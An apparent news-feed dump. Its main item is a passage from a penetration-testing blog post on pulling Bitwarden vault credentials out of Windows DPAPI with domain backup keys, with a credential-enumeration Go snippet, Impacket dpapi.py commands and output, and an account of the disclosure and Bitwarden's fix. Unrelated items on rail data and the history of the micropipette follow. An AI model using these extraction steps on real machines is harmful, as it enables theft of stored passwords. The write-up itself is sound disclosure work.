keys, which were all stored in the <code>"keys"</code> part of the user object as well.</p>
<div><pre tabindex="0"><code data-lang="json"><span><span>    <span>"privateKey"</span><span>:</span> {
</span></span><span><span>        <span>"encrypted"</span>: <span>"2.JbYuUgAf3yIDWfKAZdAi7w==|7OHkUd5GY5akE7IqLGRfJW4cL6P9KltcJOhLepjGPsyOBt0Jzr5+PPakvp8Fz3pgAYNXszCqDP8aqz/q+JhsZVtx5VP3OE6KINdmBvWEO0EX0PEMxtI08WiDNKadlFgNG9zyotIsA+6MA0cDwMIdKYPUWv7P3JB2Y0W9jlqeQQkPerg3voEvGLHOUa48xv7hJt3Q8fIPH3yoo9i5UN042QNEBmn9GBYdFw0gMNdDvMnK47j8kHQ+18SBMpIG0tjLylEmN0aA1QOXq9XHaorguOowUaLQU5funOiurFPpXv7CuXdlJiYak8nBQjdEj9euAEKe4himejHak0CUwMsNqqF7HdAhpLdGLY/gtskd/2e9v8Gwq93nBGNfRBTtfO8tWRWf+ygFqninfR9QquIHQ7BPJMHXsupoOUFlwNV7RVrG1Qa64sv0k1ksP38GyY8jzU2YZVsLWPjwHdHwXIeZzwC2CQ7JO6x9i/zkT9GJIEMBRAf6WBcIy0Q8J1LZvzlIEAJDqZaungjfwKDovaJVCHAq4WTaM0SyNj01RNARsLbVCweGlx1eQ6jootNdovOTR4jprmWwyfe9FQf9Xabm40Bwx8E2jZY2TxyS+Y0TzhdO3Rg0gETb8GHIlXeTU28fPVusjopv0eZXwe97NQhvyhDXCrZM7/546rCIvWTdcmouKdQEaXUXe02nuJl8UGjqqLuuKNxFfNez+RY7khCf7xU5wXzoC/90pNP1nM0FkB9IPe/J7EUvhBHrD+dP+6SxJ9mPDByN/u68kvBeu8R3dn234zJiqDNFWtmliGJMrYybzmViHI70tDxInv/9KoJfJK6QD+SypcEJjytZm+U8kEaWHkaxyMMUQIaHdmmhDYixjC6iclZWvAk5nMhf0wQm5NJJdfIQTWoID4kOMoS71OXExVkLVm93O5AflyD5jcWu/z6IThDY7nEg35t2ziRM1djkhnkK0Eunp45u/bpfhwYsMCnM8IJEiZ9kOOkFfCWCOZJwsk2uINmTBp8PKJD06sluhFKdOFtEDP7PMhEKVt2D2a1yMPT4PCdLYiSe18PQloUgBWC8ica4BVcGnTjGKkloqLNHF8T4nd1igW+LL+FbAj4DVJVciTV6hdHhdf0xmIoz+OhvIfzrmYxy5hjJjmesSvZq8FuK6G746cFCIQmGjT7lZuQcaR2msWawsIEcjFFFy6vIRiwQo72yeyCAmDEbgETLjSfs3jrhXf8pvcEWuci8bpsOV1zr+Od60OU+/30cFal2guazAlIT2jF+zvpf+qWC/A7lVu0iroTAoXu8/IOLxLpaF+xSso7kbrNbsKyx2fJuhNdTLOrqvnv4rw+73n11/fhF3506eN3ULj57kGFIKnRIkueMMwS7DIMla8BPT1rrUNZarTyDupF63KSjJbG9nPXneBeWjHi43jsW78PMtndfqrAr9pn02Me9vYGl8nhseEGArR3iN2fTkrWbV3wwjTbMnGfk4Z43fhsAKaGet6gjmLmcGhbeC2wSEAFgTnoMLZM/CUcqFBopyvMNVkAUs495qZCNvqgpT5f7DrJuzq+GbHK8fypdF+qxwUeUyDzFQfTvf1gKc+ISDYN0mXqDNH1II5aMu/4j0U4gvlO9vxKfJxms2tq0WGY=|3AsNkNSpAWpyHBSa2gjkJHff5vqnoU1yysEmLeXbgYc="</span>
</span></span><span><span>    }
</span></span></code></pre></div><p>As can be inferred from the encryption type, this key was also encrypted
using AES-CBC. In our test setup, the private RSA key could be used to
decrypt additional organizational keys, which were in turn required to
access organization-specific credentials.</p>
</li>
<li>
<p>Having obtained all intermediate keys, we were finally able to extract the
desired credentials:</p>
<div><pre tabindex="0"><code data-lang="json"><span><span><span>"46d9d1c2-7595-4c18-989d-053e1bf5336f"</span><span>:</span> {
</span></span><span><span>    <span>"id"</span>: <span>"46d9d1c2-7595-4c18-989d-053e1bf5336f"</span>,
</span></span><span><span>    <span>"organizationId"</span>: <span>null</span>,
</span></span><span><span>    <span>[...]</span>
</span></span><span><span>    <span>"login"</span>: {
</span></span><span><span>        <span>"username"</span>: <span>"2.K+/iMJyO27Wzqos4JtTfmA==|FB1cyKstIHGPBx4GBRk651FZ1zr3NpLBEoe1Vf3FFe4=|Y/2Kur7jIvI/ecXA64ARKs6qy7zLXJh9NVC81+uyeiI="</span>,
</span></span><span><span>        <span>"password"</span>: <span>"2.ALOh5YroSqPCkoyzviK0/g==|FDzMel84he7OPGGLatBgxw==|fVxA3OIeNkLwH3zzDU66F40ykDD0PGUOBSEcpMlp3w8="</span>,
</span></span><span><span>        <span>[...]</span>
</span></span></code></pre></div><p>This type of credential could be decrypted using the account key directly
(recognizable by the empty <code>organizationId</code>).</p>
<p>Other credentials required intermediate keys (<code>organizationId</code> is set):</p>
<div><pre tabindex="0"><code data-lang="json"><span><span><span>"fad536b0-0b44-4cf2-8741-bca6ce7881d0"</span><span>:</span> {
</span></span><span><span>    <span>"id"</span>: <span>"fad536b0-0b44-4cf2-8741-bca6ce7881d0"</span>,
</span></span><span><span>    <span>"organizationId"</span>: <span>"1d05eff7-8a52-44b1-a004-9835dc485985"</span>,
</span></span><span><span>    <span>[...]</span>
</span></span><span><span>    <span>"login"</span>: {
</span></span><span><span>        <span>"username"</span>: <span>null</span>,
</span></span><span><span>        <span>"password"</span>: <span>"2.qiVz94La8KSO+GaLbUHjGw==|Khqd0v88X8SqC2gTTrQMtQ==|PYFaG7+X9rL8LZUzbo1T3xIATDAOlybnN3tviBST3/c="</span>,
</span></span><span><span>        <span>[...]</span>
</span></span></code></pre></div></li>
</ol>
<p>Now we can see our <a href="https://github.com/RedTeamPentesting/bitwarden-windows-hello/blob/main/hello-bitwarden.py">vault decryption script</a> in action:</p>


<a href="https://blog.redteam-pentesting.de/2024/bitwarden-heist/py-shellshot.png">
            <p><img src="https://blog.redteam-pentesting.de/2024/bitwarden-heist/py-shellshot_hud447096c3f8f9a59a8a76797907affb1_266383_1200x0_resize_q100_bgffffff_box_3.jpg" alt="Terminal output of running python script to decrypt credentials.">
            </p>

            <p><img src="https://blog.redteam-pentesting.de/2024/bitwarden-heist/py-shellshot.png" alt="Terminal output of running python script to decrypt credentials.">
            </p>
        </a>
    

<p>As we had hoped, the Bitwarden vault on the Administrator’s workstation did
indeed include the credentials to access the special backup system, finally
granting us access to the sought-after backups. You can probably imagine the
astonishment of our client when we told them about the attack, as they had no
idea that domain admins can bypass Bitwarden’s vault protections.</p>
<p>Well, we’ve always known attackers with domain admin privileges are quite
powerful in the first place, but at least the vault is protected against
unprivileged attackers on the local workstation, right? …right?</p>
<h3 id="but-wait-theres-more-who-needs-biometrics-anyway">But Wait, There’s More: Who Needs Biometrics, Anyway?</h3>
<p>In the process of trying to understand this whole mechanism, we started playing
around with DPAPI in our lab setup. For example, we thought that using the API
itself is probably easier than cobbling together the key files from <code>%AppData%</code>.
To familiarize ourselves with DPAPI, we wrote a tiny Go program to see what
credentials are stored in DPAPI on the workstation using the
<a href="https://blog.redteam-pentesting.de/2024/bitwarden-heist/github.com/danieljoos/wincred">wincred</a> library. The full script is available
<a href="https://github.com/RedTeamPentesting/bitwarden-windows-hello/blob/main/dpapidump/main.go">here</a>, but the only interesting lines are these:</p>
<div><pre tabindex="0"><code data-lang="Go"><span><span><span>creds</span>, <span>err</span> <span>:=</span> <span>wincred</span>.<span>List</span>()
</span></span><span><span><span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
</span></span><span><span>    <span>return</span> <span>fmt</span>.<span>Errorf</span>(<span>"wincred list: %w"</span>, <span>err</span>)
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>for</span> <span>_</span>, <span>cred</span> <span>:=</span> <span>range</span> <span>creds</span> {
</span></span><span><span>    <span>credentialBlob</span>, <span>err</span> <span>:=</span> <span>decodeUTF16LE</span>(<span>cred</span>.<span>CredentialBlob</span>)
</span></span><span><span>    <span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
</span></span><span><span>        <span>credentialBlob</span> = <span>fmt</span>.<span>Sprintf</span>(<span>"%q"</span>, <span>string</span>(<span>cred</span>.<span>CredentialBlob</span>))
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>	<span>fmt</span>.<span>Printf</span>(<span>"%s:\n    * %s\n"</span>, <span>cred</span>.<span>UserName</span>, <span>credentialBlob</span>)
</span></span><span><span>}
</span></span></code></pre></div><p>It only calls <code>windcred.List()</code> which is a thin Go wrapper around
<a href="https://learn.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credenumeratew">CredEnumerateW</a>
which simply “enumerates the credentials from the user’s credential set”.
However, we did not expect that this function immediately spits out Bitwarden’s
<em>derived/biometrics key</em> without prompting for biometric authentication using
Windows Hello:</p>


<a href="https://blog.redteam-pentesting.de/2024/bitwarden-heist/godpapi.png">
            <p><img src="https://blog.redteam-pentesting.de/2024/bitwarden-heist/godpapi.png" alt="Terminal output of Go program that lists DPAPI credentials.">
            </p>

            <p><img src="https://blog.redteam-pentesting.de/2024/bitwarden-heist/godpapi.png" alt="Terminal output of Go program that lists DPAPI credentials.">
            </p>
        </a>
    

<p>This means that any process that runs as the low-privileged user session can
simply ask DPAPI for the credentials to unlock the vault, no questions asked and
no PIN or fingerprint prompt required and Windows Hello is not even involved at
all. The only caveat is that this does not work for other user accounts.</p>
<p>Bitwarden itself does prompt for biometric authentication when unlocking the
vault, but it wouldn’t even have to. In fact, you could probably remove a few
lines from the source code and have it unlock without a prompt. The whole issue is
likely a result of misunderstanding the details of the <code>CredWriteW</code> function, or
maybe an unawareness of the potential pitfalls of using DPAPI to store
encryption keys.</p>
<h3 id="a-feature-not-a-bug">A Feature, Not a Bug</h3>
<p>We contacted both Bitwarden and Microsoft about the details of this attack. We
always make sure to follow industry best practices for responsible disclosure,
even if it is unclear whether our findings are actual vulnerabilities. For the
attack explained in this blog post, this was the case as it is not clear whether
the attack is in scope of either Bitwarden (since the attack already assumes
access to the workstation of the victim and the Windows domain) or Microsoft
(who are only involved by providing DPAPI to store the decryption keys).
Microsoft indeed responded to our report by stating that DPAPI and its backup
mechanism were used exactly as intended, and that our attack therefore did not
indicate any vulnerabilities on their side.</p>
<p>Bitwarden also responded, however they agreed that this behavior was unintended,
and stated that they were already tracking a similar issue internally. As it
turns out, we were not the first to discover this in March 2023, it had already
been <a href="https://hackerone.com/reports/1874155">reported to Bitwarden through
HackerOne</a>. However, we did not know this
since it was only disclosed in June 2023. Since then the vulnerability is known
as <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-27706">CVE-2023-27706</a>.</p>
<p>Bitwarden has since made changes to their codebase to mitigate this particular
scenario, which we will quickly summarize in the next section. They have also
changed the default setting when using Windows Hello as login feature to require
entering the main password at least once when Bitwarden is started.</p>
<h3 id="biometrics-in-bitwarden-now">Biometrics in Bitwarden Now</h3>
<p>To prepare for this blog post, we also took a look at how credentials are stored
in the current version of Bitwarden <a href="https://github.com/bitwarden/clients/releases/tag/desktop-v2023.10.1">Desktop
v2023.10.1</a>.
Bitwarden still makes use of Windows Hello and DPAPI, which are still accessible
using the domain backup key. However the content of the secured data blobs has
changed:</p>
<pre tabindex="0"><code>$ dpapi.py credential -f DAF81666731C8E899E9464647512792B -key 0xad69553beafe0c5bcaf3b61a61136da64c50c57406f3649c6f70c11dc8d22a09d87241bd769ddbcb022a64744cbcd28342176593da30c825a0a56105496f0d5a
Impacket v0.10.0.post1+20230417.105142.28de12f1 - Copyright 2022 Fortra

[CREDENTIAL]
LastWritten : 2023-11-28 15:01:47
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=Bitwarden_biometric/ea0b6061-4381-4534-9e91-50cf98753530_user_biometric
Description :
Unknown     :
Username    : ea0b6061-4381-4534-9e91-50cf98753530_user_biometric
Unknown     : 0.OQeotvzeRCpHoEb2c7TZ2g==|3PqjMDiq1J9hHnO7KESu0fG6Vl4yl2siOImoZghma2FpfNJmfKyGAmJNq00ay3/HV1dd855YMlNc7k3wSam47nxWEAuQU/oCaiPH9q5k9I+OJuvv01HVniqq7ERzRWLp

$ dpapi.py credential -f 1A52DC5CA68038A3E4216121AA1A7E0E -key 0xad69553beafe0c5bcaf3b61a61136da64c50c57406f3649c6f70c11dc8d22a09d87241bd769ddbcb022a64744cbcd28342176593da30c825a0a56105496f0d5a
Impacket v0.10.0.post1+20230417.105142.28de12f1 - Copyright 2022 Fortra

[CREDENTIAL]
LastWritten : 2023-11-28 15:01:47
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=Bitwarden_biometric/ea0b6061-4381-4534-9e91-50cf98753530_user_biometric_witness
Description :
Unknown     :
Username    : ea0b6061-4381-4534-9e91-50cf98753530_user_biometric_witness
Unknown     : 0.OQeotvzeRCpHoEb2c7TZ2g==|Kbo2ptPoXcw3N30AnYA8fw==
</code></pre><p>Instead of storing the valuable <em>derived/biometric key</em> via DPAPI, Bitwarden now
stores two secured data blobs, which are encrypted and can no longer be used to
decrypt the <em>account encryption key</em> directly (indicated by the encryption type
0). The stored data blobs are now additionally encrypted using the
<a href="https://learn.microsoft.com/en-us/uwp/api/windows.security.credentials.keycredentialmanager">KeyCredentialManager
API</a>
which actually requires interaction with Windows Hello to produce a decryption
key. While it seems to us that this fixes the issue, we have not actually tested
the new implementation for other vulnerabilities, yet.</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[UK 2022 rail station flow images (146 pts)]]></title>
            <link>https://github.com/anisotropi4/kingfisher/blob/main/station.md</link>
            <guid>38852580</guid>
            <pubDate>Wed, 03 Jan 2024 10:37:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/anisotropi4/kingfisher/blob/main/station.md">https://github.com/anisotropi4/kingfisher/blob/main/station.md</a>, See on <a href="https://news.ycombinator.com/item?id=38852580">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
          <nav aria-label="Global">
            <ul>
                <li>
      
      <div>
            <ul>
                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Actions&quot;,&quot;label&quot;:&quot;ref_cta:Actions;&quot;}" href="https://github.com/features/actions">
      
      <div>
        <p>Actions</p><p>
        Automate any workflow
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Packages&quot;,&quot;label&quot;:&quot;ref_cta:Packages;&quot;}" href="https://github.com/features/packages">
      
      <div>
        <p>Packages</p><p>
        Host and manage packages
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Security&quot;,&quot;label&quot;:&quot;ref_cta:Security;&quot;}" href="https://github.com/features/security">
      
      <div>
        <p>Security</p><p>
        Find and fix vulnerabilities
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Codespaces&quot;,&quot;label&quot;:&quot;ref_cta:Codespaces;&quot;}" href="https://github.com/features/codespaces">
      
      <div>
        <p>Codespaces</p><p>
        Instant dev environments
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Copilot&quot;,&quot;label&quot;:&quot;ref_cta:Copilot;&quot;}" href="https://github.com/features/copilot">
      
      <div>
        <p>Copilot</p><p>
        Write better code with AI
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Code review&quot;,&quot;label&quot;:&quot;ref_cta:Code review;&quot;}" href="https://github.com/features/code-review">
      
      <div>
        <p>Code review</p><p>
        Manage code changes
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Issues&quot;,&quot;label&quot;:&quot;ref_cta:Issues;&quot;}" href="https://github.com/features/issues">
      
      <div>
        <p>Issues</p><p>
        Plan and track work
      </p></div>

    
</a></li>

                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Discussions&quot;,&quot;label&quot;:&quot;ref_cta:Discussions;&quot;}" href="https://github.com/features/discussions">
      
      <div>
        <p>Discussions</p><p>
        Collaborate outside of code
      </p></div>

    
</a></li>

            </ul>
          </div>
</li>


                <li>
      
      
</li>


                <li>
      
      <div>
          <div>
            <ul>
                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Open Source&quot;,&quot;action&quot;:&quot;click to go to GitHub Sponsors&quot;,&quot;label&quot;:&quot;ref_cta:GitHub Sponsors;&quot;}" href="https://github.com/sponsors">
      
      <div>
        <p>GitHub Sponsors</p><p>
        Fund open source developers
      </p></div>

    
</a></li>

            </ul>
          </div>
          <div>
            <ul>
                <li>
  <a data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Open Source&quot;,&quot;action&quot;:&quot;click to go to The ReadME Project&quot;,&quot;label&quot;:&quot;ref_cta:The ReadME Project;&quot;}" href="https://github.com/readme">
      
      <div>
        <p>The ReadME Project</p><p>
        GitHub community articles
      </p></div>

    
</a></li>

            </ul>
          </div>
          
      </div>
</li>


                <li>
    <a data-analytics-event="{&quot;category&quot;:&quot;Header menu top item (logged out)&quot;,&quot;action&quot;:&quot;click to go to Pricing&quot;,&quot;label&quot;:&quot;ref_cta:Pricing;&quot;}" href="https://github.com/pricing">Pricing</a>
</li>

            </ul>
          </nav>

        <div>
                


<qbsearch-input data-scope="repo:anisotropi4/kingfisher" data-custom-scopes-path="/search/custom_scopes" data-delete-custom-scopes-csrf="Jkafbe_Rbcf2AtRT6PBJzics1lgN6GTD37g-DBvSlky4cMlmsrhWrqbSj0fq5rpTOhtPzVY4esXqJXbA4Z69kQ" data-max-custom-scopes="10" data-header-redesign-enabled="false" data-initial-value="" data-blackbird-suggestions-path="/search/suggestions" data-jump-to-suggestions-path="/_graphql/GetSuggestedNavigationDestinations" data-current-repository="anisotropi4/kingfisher" data-current-org="" data-current-owner="anisotropi4" data-logged-in="false" data-copilot-chat-enabled="false" data-blackbird-indexed-repo-csrf="<esi:include src=&quot;/_esi/rails_csrf_token_form_hidden?r=fwnhz5lvKQxCu%2B34U%2FAue0rW9N4vr%2FU4LOkLZaC8yPCOsAXABwhIjpnGlh7YT9JxUBf1fDAUkYGZHR3MNhYRit202QsEJNnch53FwXoYk8xv8Kd%2FXJu2pDZavtN%2Bymgd1bF5W4mjFfwowBnq6YLOdOfB1uQciuTOSQpSlS6S2ax%2FklQgCViSw%2BxCjz7vH8dSCWcIunCzmXGdCaxpHS6LsjoPZqtHZwIQstrUBCumMFev5Ca2wI0j2yPb%2BfoHe0DfxN2LvYwr0BPxvCru%2BdH3lT15nefUt4Zmj0Qhaogw2dwrzUjEHAKn2PzncGaRvM9UEpHAhFaY0H10IY4IBz6%2BWp60wUp90O47TGgohDD7ImD7MAyNNWrFQvpzdxImdYzaR%2BBiXCitCvUuovkigiQ2%2Br15tpGlTQr5WF%2FkdWEe29Z7O8VxiC4qClXbpQA6yB6SpzK0FB0HZZJc0HpFgXeIDbsecCAgyVPUCNorcf%2BdRyIfIknpNHe0AsUB5bSkFtyElOWY3maTsoo7Y729Du7q87CHnXPYnE11vuWDdBB0EvspM86%2B4SDe0Mcp6eKITkXzXpY%3D--v9Iz%2B7veJE9u9tu9--rVsbFN3T2%2FVucffsKj4Z6g%3D%3D&quot; />">
  <div data-modal-dialog-overlay="" data-action="click:qbsearch-input#searchInputContainerClicked">
  <modal-dialog data-action="close:qbsearch-input#handleClose cancel:qbsearch-input#handleClose" data-target="qbsearch-input.searchSuggestionsDialog" role="dialog" id="search-suggestions-dialog" aria-modal="true" aria-labelledby="search-suggestions-dialog-header" data-view-component="true">
      <h2 id="search-suggestions-dialog-header">Search code, repositories, users, issues, pull requests...</h2>
    
</modal-dialog></div>
  
  <div>
    
<div data-modal-dialog-overlay="">
  <modal-dialog data-target="qbsearch-input.feedbackDialog" data-action="close:qbsearch-input#handleDialogClose cancel:qbsearch-input#handleDialogClose" role="dialog" id="feedback-dialog" aria-modal="true" aria-disabled="true" aria-labelledby="feedback-dialog-title" aria-describedby="feedback-dialog-description" data-view-component="true">
    <div data-view-component="true">
    <p>
      <h2 id="feedback-dialog-title">
        Provide feedback
      </h2>
    </p>
    
  </div>
      
      
</modal-dialog></div>

    <custom-scopes data-target="qbsearch-input.customScopesManager">
    
<div data-modal-dialog-overlay="">
  <modal-dialog data-target="custom-scopes.customScopesModalDialog" data-action="close:qbsearch-input#handleDialogClose cancel:qbsearch-input#handleDialogClose" role="dialog" id="custom-scopes-dialog" aria-modal="true" aria-disabled="true" aria-labelledby="custom-scopes-dialog-title" aria-describedby="custom-scopes-dialog-description" data-view-component="true">
    <div data-view-component="true">
    <p>
      <h2 id="custom-scopes-dialog-title">
        Saved searches
      </h2>
        <h2 id="custom-scopes-dialog-description">Use saved searches to filter your results more quickly</h2>
    </p>
    
  </div>
      
      
</modal-dialog></div>
    </custom-scopes>
  </div>
</qbsearch-input>

            <p><a href="https://github.com/signup?ref_cta=Sign+up&amp;ref_loc=header+logged+out&amp;ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&amp;source=header-repo&amp;source_repo=anisotropi4%2Fkingfisher" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header menu&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/anisotropi4/kingfisher/blob/main/station.md&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="c0b5191e8b5b0ebfb05d0272de955d3957f111471c41c33106cd9caae5ec70a6" data-analytics-event="{&quot;category&quot;:&quot;Sign up&quot;,&quot;action&quot;:&quot;click to sign up for account&quot;,&quot;label&quot;:&quot;ref_page:/<user-name>/<repo-name>/blob/show;ref_cta:Sign up;ref_loc:header logged out&quot;}">
              Sign up
            </a>
        </p></div>
      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Making the Micropipette (130 pts)]]></title>
            <link>https://press.asimov.com/resources/making-the-micropipette</link>
            <guid>38852534</guid>
            <pubDate>Wed, 03 Jan 2024 10:32:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://press.asimov.com/resources/making-the-micropipette">https://press.asimov.com/resources/making-the-micropipette</a>, See on <a href="https://news.ycombinator.com/item?id=38852534">Hacker News</a></p>
<div id="readability-page-1" class="page"><div fs-toc-offsettop="25px" fs-toc-element="contents"><h2><strong>“Hazards of Mouth Pipetting”</strong></h2><p>The micropipette, an instrument favored by researchers around the world to measure and move liquids from one container to another and used for everything from forensic analysis to DNA sequencing, was invented by an obscure, <a target="_blank" href="https://www.chemistryworld.com/opinion/schnitgers-pipette/7789.article">32-year-old German postdoc</a> after a particularly productive two-day tantrum.</p><p><a target="_blank" href="https://en.wikipedia.org/wiki/Heinrich_Schnitger">Heinrich Schnitger</a> was born in Lemgo, Germany in 1925. He fought in the Second World War, but was hospitalized with tuberculosis and removed from active duty as a result. The illness probably saved his life. After the war, Schnitger earned a PhD in medicine and began a research position at the University of Marburg.</p><p>There, Schnitger busied himself with chromatography, a technique to isolate molecules by flowing liquids through columns and then painstakingly sorting the tiny drops that emerged. At the time, these experiments were done entirely with mouth pipettes. Researchers would suck liquids into a glass tube and then transfer the liquid to another container. But mouth pipettes were fragile, inaccurate, and dangerous.</p><figure><p><img src="https://assets-global.website-files.com/6518fc1601bb06d3facf5039/659374040375bb61720ca1ea_38455898272_650f944b91_o.jpg" loading="lazy" alt=""></p><figcaption>Dr. Adah Elizabeth Verder using a mouth pipette, ca. 1938. Credit: <a href="https://www.flickr.com/photos/nihgov/38455898272" target="_blank">National Institutes of Health</a></figcaption></figure><p>A <a target="_blank" href="https://scholar.google.com/scholar_lookup?journal=Med+Klin&amp;title=The+prevention+of+laboratory+infection&amp;author=L+Paneth&amp;volume=11&amp;publication_year=1915&amp;pages=1398-9&amp;">1915 survey</a> of 57 research laboratories found that 40 percent of workplace-related infections were directly linked to mouth pipetting. Decades later, in the 1960s, U.S. Army researchers penned an article entitled, “<a target="_blank" href="https://apps.dtic.mil/sti/tr/pdf/AD0640356.pdf">Hazards of Mouth Pipetting</a>.” Leaving no room for ambiguity, they conclude in all caps: DO NOT MOUTH PIPETTE INFECTIOUS OR TOXIC FLUIDS and USE A PIPETTOR DEVICE FOR PIPETTING.<sup>1</sup></p><p>Schnitger viewed mouth pipettes with “<a target="_blank" href="https://doi.org/10.1038%2Fsj.embor.7400520">great contempt</a>.” In 1957, presumably driven by this pique, he vanished from the laboratory and returned, two days later, “with a self-designed tool to pipette microlitre volumes.” On May 3rd, Schnitger <a target="_blank" href="https://patents.google.com/patent/DE1090449B/en">filed a patent entitled</a>, “Device for quick and precise pipetting of small amounts of liquid.” The patent was granted in 1961, and his design had “<a target="_blank" href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC1369176/">all the essential features</a> of the modern pipette,” according to a close witness of the invention, including a spring-loaded piston, second spring to shoot out residual liquid, and plastic tip.<sup>2</sup></p><p>It is nearly impossible to imagine modern biology without the micropipette, which has enabled scientists to manipulate cells with a much higher degree of precision. It was used in the first experiments with <a target="_blank" href="https://www.pnas.org/doi/epdf/10.1073/pnas.69.10.2904">recombinant DNA</a> and also, as early as 1968, to determine the <a target="_blank" href="https://www.nature.com/articles/218346a0">sex of rabbit embryos</a>, a necessary precursor to the development of <em>in vitro </em>fertilization. But this tool’s widespread adoption was not inevitable, nor were its features preordained. The micropipette only exists thanks to a long line of scientists and businessmen whose creative iterations, savvy deals, and expensive legal battles shaped the course of modern science.</p><p>Like much technology, the development of the micropipette is a story of adaptive radiation. Inventors living in completely different parts of the world each came up with their own ways to move around small volumes of liquid. Many designs failed, other features caught on, and the winners — such as disposable plastic tips and knobs to adjust the micropipette’s volume — were gradually reconfigured into the devices used today.</p><p>Although the modern micropipette begins with Schnitger’s exasperation, his own story, sadly, ends in 1964, when he went for a swim in a Bavarian mountain lake and drowned. While this was an untimely end for a great innovator, it is oddly fitting that a man best known for creating a device to move around small volumes of liquid died unable to manage large ones.</p><h2><strong>The Modern Micropipette</strong></h2><p>Schnitger’s first micropipette was made from simple parts. He had taken a small metal syringe, similar to those used in hospitals, and added <a target="_blank" href="https://thebiomedicalscientist.net/science/no-more-sucking-60-years-micropipette">a spring and end stop</a> to it. Schnitger replaced the syringe needle with a plastic tip, which he had crafted from a polyethylene tube, and added a little air pocket to keep liquids from touching the metal pistons and contaminating or corroding the inside of the device.<sup>3</sup> To suck up liquid, Schnitger pressed the plunger to the stop, put the tip into the liquid, and then released the plunger. Pressing the plunger again expelled the liquid.</p><p>Despite its novelty, Schnitger’s design lacked several features that modern scientists take for granted. The device’s volume could not be adjusted, and the polyethylene tips were too expensive to be disposable, which made them prone to contamination. A solution to these deficits arrived by way of a broad-faced Finn in 1969.</p><figure><p><img src="https://assets-global.website-files.com/6518fc1601bb06d3facf5039/6593744c96a96e82e2fb7a19_pipette_evolution%20(2).png" loading="lazy" alt=""></p><figcaption>Evolution of the micropipette. (Top) Heinrich Schnitger’s 1957 design was refined by scientists at Eppendorf, a German laboratory equipment manufacturer. (Middle) An <a target="_blank" href="https://www.reddit.com/media?url=https%3A%2F%2Fi.redd.it%2Fqypp66y3i6w91.jpg">original Gilson micropipette</a>, probably manufactured between 1969 and 1972. (Bottom) A modern Gilson Pipetman.</figcaption></figure><p><a target="_blank" href="https://doi.org/10.1111/j.1540-6520.2011.00488.x">Osmo Suovaniemi</a> grew up in a farming family from Kihniö, Finland, a tiny town on a small lake one-and-a-half hours north of Tampere, the nearest mid-sized city. He studied medicine by day and worked in research labs at the University of Helsinki by night. While mouth pipetting one night in the lab, Suovaniemi “almost swallowed a piece of rat’s brain,” according to a <a target="_blank" href="https://jyx.jyu.fi/bitstream/handle/123456789/44068/kontinenbiohitdraft.pdf?sequence=1&amp;isAllowed=y">2014 review</a>. After tinkering with syringes, springs, and screws, Suovaniemi assembled a micropipette with a knob on top to adjust the volume inside—no mouth-suction required.</p><p>Suovaniemi <a target="_blank" href="https://worldwide.espacenet.com/patent/search/family/008507281/publication/FI44070B?q=FI44070">filed a patent application</a> on his adjustable micropipette in 1969, at the age of 26, and founded a company to produce the devices.<sup>4</sup> His work is little-known outside Finland, and the design didn’t catch on, in part because it lacked a numerical gauge to display volumes, which hampered its precision.<sup>5</sup>&nbsp;</p><p>Shortly after making his adjustable micropipette, Suovaniemi made a second pipette that could move multiple liquids around at once; it was the first multichannel pipette. Interestingly, Suovaniemi didn’t attribute his inventions to diligence or tireless ambition, but quite the opposite. “I’m extremely lazy by nature,” Suovaniemi <a target="_blank" href="https://journals.sagepub.com/doi/10.1111/j.1540-6520.2011.00488.x">once told</a> an interviewer, so “I created a pipette with nine 